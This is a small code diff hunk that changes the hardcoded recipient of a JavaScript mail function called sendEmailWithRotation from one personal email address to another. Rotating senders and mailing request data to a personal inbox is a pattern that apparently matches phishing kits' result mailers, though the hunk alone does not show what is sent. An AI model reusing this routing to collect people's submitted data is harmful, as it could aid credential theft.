@@ -75,7 +75,7 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
 
     const mailOptions = {
       from: user,
-      to: "hey.heatherw@outlook.com",
+      to: "Johnmarkk2024@gmail.com",
       subject: subject,
       text: fullMessage,
     };
